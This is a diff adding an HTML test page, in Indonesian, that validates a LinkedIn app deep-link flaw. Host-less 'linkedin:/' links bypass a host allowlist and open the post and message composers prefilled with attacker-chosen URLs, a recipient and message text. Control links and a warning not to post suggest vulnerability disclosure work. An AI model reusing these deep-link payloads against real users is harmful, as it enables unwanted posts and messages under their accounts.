@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="id">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>AIAMR-F008</title>
+<style>
+ :root{color-scheme:dark}
+ body{font:16px/1.5 system-ui,-apple-system,sans-serif;margin:0;padding:20px 16px 60px;
+      background:#0f1115;color:#e8e8ea;max-width:680px;margin:0 auto}
+ h1{font-size:20px;margin:0 0 2px}
+ p.sub{margin:0 0 20px;color:#8b8f98;font-size:13px}
+ h2{font-size:13px;letter-spacing:.06em;text-transform:uppercase;color:#7aa7d8;
+    margin:26px 0 8px;border-bottom:1px solid #232733;padding-bottom:6px}
+ a.btn{display:block;padding:15px 16px;margin:10px 0 4px;border-radius:12px;
+       text-decoration:none;color:#fff;font-weight:600;font-size:15px}
+ .go{background:#1f7a45}
+ .ctl{background:#3a3f4b}
+ .pos{background:#2a5b8f}
+ code{display:block;font-size:11.5px;color:#8b8f98;word-break:break-all;margin:0 0 16px;padding:0 4px}
+ .want{display:block;font-size:12.5px;color:#c8ccd4;margin:0 0 16px;padding:0 4px}
+ .warn{background:#3a1f1f;border:1px solid #6b2b2b;border-radius:10px;padding:12px 14px;
+       font-size:13.5px;margin:18px 0}
+ ol{padding-left:20px;font-size:14px;color:#c8ccd4}
+ li{margin:6px 0}
+</style>
+
+<h1>AIAMR-F008</h1>
+<p class="sub">Rig validasi manual. Halaman ini tidak memuat satu baris script pun: semua di bawah adalah tautan <code style="display:inline;padding:0">&lt;a href&gt;</code> biasa.</p>
+
+<div class="warn"><b>Jangan tekan Post atau Send.</b> Setiap layar yang terbuka berhenti tepat satu ketuk sebelum terbit. Keluar pakai tombol back, buang draf kalau ditawari.</div>
+
+<p class="sub">Urutannya penting: kerjakan 1 dan 2 dulu (baseline), baru 3, 4, 5, lalu 6, 7, 8 sebagai kontrol negatif.</p>
+
+<h2>1 dan 2. Baseline</h2>
+
+<a class="btn ctl" href="linkedin://aiamr-f008.invalid/cws/share?url=https%3A%2F%2Faiamr-f008.invalid%2Fattacker-page">1. Rute sama, ditulis pakai host (dua garis miring)</a>
+<code>linkedin://aiamr-f008.invalid/cws/share?url=...</code>
+<span class="want">Yang diharapkan: TIDAK ada komposer yang terbuka. Allowlist host bekerja. Kalau ini justru membuka komposer, hentikan validasi, karena berarti yang menembus bukan bentuk host-null.</span>
+
+<a class="btn pos" href="linkedin:/in/me">2. linkedin:/in/me (satu garis miring, tanpa host)</a>
+<code>linkedin:/in/me</code>
+<span class="want">Yang diharapkan: aplikasi terbuka di profil akun yang sedang login. Ini kontrol positif: bentuk host-null memang sampai ke tabel rute.</span>
+
+<h2>3, 4, 5. Rute yang bocor</h2>
+
+<a class="btn go" href="linkedin:/cws/share?url=https%3A%2F%2Faiamr-f008.invalid%2Fattacker-page">3. cws/share, komposer post publik</a>
+<code>linkedin:/cws/share?url=https://aiamr-f008.invalid/attacker-page</code>
+<span class="want">Yang diharapkan: komposer post terbuka, audiens tertulis <b>Anyone</b>, tombol <b>Post</b> aktif, dan pratinjau berisi aiamr-f008.invalid/attacker-page.</span>
+
+<a class="btn go" href="linkedin:/shareArticle?url=https%3A%2F%2Faiamr-f008.invalid%2Fattacker-page">4. shareArticle, rute kembarnya</a>
+<code>linkedin:/shareArticle?url=https://aiamr-f008.invalid/attacker-page</code>
+<span class="want">Yang diharapkan: layar yang sama persis. Membuktikan kelalaiannya ada di lebih dari satu rute.</span>
+
+<a class="btn go" href="linkedin:/messaging/compose?recipient=urn%3Ali%3Afsd_profile%3AACoAACdSAqYBeO3pDLcnERPSS-eQxiXulAG7zmM&subject=AIAMR-F008&body=AIAMR-F008%20teks%20ini%20dipilih%20penyerang%20https%3A%2F%2Faiamr-f008.invalid%2Fx">5. messaging/compose, penerima dan isi pesan</a>
+<code>linkedin:/messaging/compose?recipient=urn:li:fsd_profile:ACoAACdSAqYB...&amp;body=AIAMR-F008...</code>
+<span class="want">Yang diharapkan: layar <b>New message</b>, kolom To sudah terisi akun uji kedua, badan pesan sudah berisi teks AIAMR-F008 verbatim.</span>
+
+<h2>6, 7, 8. Kontrol negatif per rute</h2>
+
+<a class="btn ctl" href="linkedin:/sales-web-view?url=https%3A%2F%2Faiamr-f008.invalid%2Fx">6. sales-web-view</a>
+<code>linkedin:/sales-web-view?url=https://aiamr-f008.invalid/x</code>
+<span class="want">Host-null juga, parameter url juga, tapi handler-nya mewajibkan https dan www.linkedin.com. Yang diharapkan: ditolak.</span>
+
+<a class="btn ctl" href="linkedin:/learning-app?url=https%3A%2F%2Faiamr-f008.invalid%2Fx">7. learning-app</a>
+<code>linkedin:/learning-app?url=https://aiamr-f008.invalid/x</code>
+<span class="want">Idem, handler-nya mewajibkan path /learning/. Yang diharapkan: ditolak.</span>
+
+<a class="btn ctl" href="linkedin:/cws/share">8. cws/share tanpa parameter url</a>
+<code>linkedin:/cws/share</code>
+<span class="want">Komposer tetap terbuka tapi kosong. Memisahkan "rute tercapai" dari "isi dipilih penyerang".</span>
+
+<h2>Kalau ada yang tidak terbuka sama sekali</h2>
+<ol>
+<li>Pastikan aplikasi LinkedIn terpasang dan sedang login (buka tab Me).</li>
+<li>Chrome kadang menahan skema non-http kalau tautan dibuka dari tab yang dipulihkan. Muat ulang halaman ini, lalu ketuk lagi.</li>
+<li>Jangan buka halaman ini di dalam in-app browser (misalnya dari aplikasi chat). Buka di Chrome langsung.</li>
+</ol>
+</html>
